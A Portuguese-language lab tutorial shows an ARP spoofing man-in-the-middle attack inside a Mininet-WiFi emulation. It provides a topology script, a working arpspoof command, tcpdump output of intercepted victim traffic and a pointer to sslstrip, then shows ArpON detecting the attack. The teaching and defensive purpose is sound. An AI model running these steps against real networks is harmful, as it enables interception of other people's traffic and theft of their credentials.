---
tags: security-tutorials
---

# ARP Spoofing

**In this short demo you will:** 
- How to perform ARP Spoofing attack

**Requirements:** 
- Mininet-WiFi - https://github.com/intrig-unicamp/mininet-wifi
- dsniff
- arpon
- sslstrip


Antes de tudo você precisa identificar a topologia de rede que será gerada através do código abaixo:

```python=
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

from mininet.log import setLogLevel, info
from mn_wifi.node import OVSKernelAP
from mn_wifi.link import wmediumd
from mn_wifi.cli import CLI
from mn_wifi.net import Mininet_wifi


def topology():
    "Create a network."
    net = Mininet_wifi()

    info("*** Creating nodes\n")
    ap1 = net.addAccessPoint('ap1', ssid='new-ssid', mode='g',
                             channel='1', position='10,10,0',
                             failMode="standalone")
    sta1 = net.addStation('sta1', position='10,20,0')
    sta2 = net.addStation('sta2', position='10,30,0')

    info("*** Configuring wifi nodes\n")
    net.configureWifiNodes()

    info("*** Starting network\n")
    net.build()
    net.addNAT().configDefault()
    ap1.start([])
    
    sta2.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```


Neste tutorial, vamos simular os passos ilustrados na figura de forma a mostrar na prática como ocorre o ataque de ARP Spoofing. Para tanto, vamos considerar executar o script acima. Considerando que o nome do arquivo seja `arp.py` nós o executaríamos da seguinte forma:

```
sudo python arp.py
```

Em seguida, faremos uma tentativa de ping a partir de `sta1` para o endereço 8.8.8.8.

```
mininet-wifi> sta1 ping -c1 8.8.8.8

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=68.8 ms
--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 68.893/68.893/68.893/0.000 ms
```


Como é possível perceber o ping foi realizado com sucesso. Agora, vamos verificar a tabela ARP de `sta1`. Na tabela deverá constar o endereço IP e também o endereço MAC do gateway padrão de `sta1`.

```
mininet-wifi> sta1 arp -a
_gateway (10.0.0.3) at 0a:1e:54:0e:66:96 [ether] on sta1-wlan0
```

Então, vamos simular o ataque de ARP Spoofing e fazer com que `sta1` entenda que o seu gateway na verdade é `sta2`. Primeiro, abra 2 (dois) terminais para `sta2`.

```
mininet-wifi> xterm sta2 sta2
```

Então, no terminal de `sta2` execute o arpspoof, conforme abaixo.

```
sta2# arpspoof -i sta2-wlan0 -t 10.0.0.1 10.0.0.3
```

O comando acima induz 10.0.0.1, que é a vítima, a entender que 10.0.0.2, ou seja, `sta2`, representa o endereço do gateway padrão. Então, após alguns segundos verificamos novamente a tabela ARP de `sta1`.

```
mininet-wifi> sta1 arp -a
_gateway (10.0.0.3) at 02:00:00:00:01:00 [ether] on sta1-wlan0
? (10.0.0.2) at 02:00:00:00:01:00 [ether] on sta1-wlan0
```

Aqui, já podemos notar que o endereço MAC do gateway padrão já não é mais o mesmo do identificado anteriormente. Agora, realizamos um novo ping de `sta1` para o endereço público 8.8.8.8, ao mesmo tempo em que utilizamos o tcpdump no outro terminal de `sta2` para verificar se ele está recebendo tráfego enviado pela vítima.

```
sta2# tcpdump -i sta2-wlan0
20:30:34.970402 IP 10.0.0.1 > alpha-Inspiron: ICMP echo request, id 12251,seq 8, length 64
20:30:34.971552 IP alpha-Inspiron > 10.0.0.1: ICMP echo reply, id 12251, seq 8, length 64
20:30:35.430387 ARP, Reply _gateway is-at 02:00:00:00:01:00 (oui Unknown), length 28
20:30:35.972565 IP 10.0.0.1 > alpha-Inspiron: ICMP echo request, id 12251,seq 9, length 64
20:30:35.973722 IP alpha-Inspiron > 10.0.0.1: ICMP echo reply, id 12251, seq 9, length 64
20:30:36.973743 IP 10.0.0.1 > alpha-Inspiron: ICMP echo request, id 12251, seq 10, length 64
20:30:36.974884 IP alpha-Inspiron > 10.0.0.1: ICMP echo reply, id 12251, seq 10, length 64
```

```
mininet-wifi> sta1 ping -c10 8.8.8.8
```

Após alguns pacotes enviados por `sta1` é possível notar que `sta2` passou a receber os pacotes enviados por ele, pois `sta1` passou a entender que `sta2` seria o verdadeiro gateway padrão. A partir deste momento, `sta2`, o atacante, pode inclusive utilizar de simples ferramentas como sslstrip para realizar ataques em cima do protocolo HTTPS (Hyper Text Transfer Protocol Secure). Vale a pena citar também que esse tipo de ataque pode ser evitado com o uso de ferramentas como ARP handler inspection (ArpON).


Para ver como evitar esse tipo de ataque você pode utilizar o arpon. Para tanto, basta executá-lo em `sta1` antes do ataque ser realizado.


```
mininet-wifi> xterm sta1
arpon -D -i sta1-wlan0
```

Caso houver um ataque em execução será possível observá-lo após executar o arpon, conforme ilustrado abaixo:


```
arpon -D -i sta1-wlan0
Oct 30 10:01:41 [INFO] Start DARPI on sta1-wlan0
Oct 30 10:01:41 [INFO] CLEAN, 10.0.0.3 was at 52:1e:e8:62:58:11 on sta1-wlan0
Oct 30 10:01:53 [INFO] DENY, 10.0.0.3 was at 2:0:0:0:1:0 on sta1-wlan0
Oct 30 10:01:53 [INFO] ALLOW, 10.0.0.3 is at 52:1e:e8:62:58:11 on sta1-wlan0
Oct 30 10:01:55 [INFO] DENY, 10.0.0.3 was at 2:0:0:0:1:0 on sta1-wlan0
```
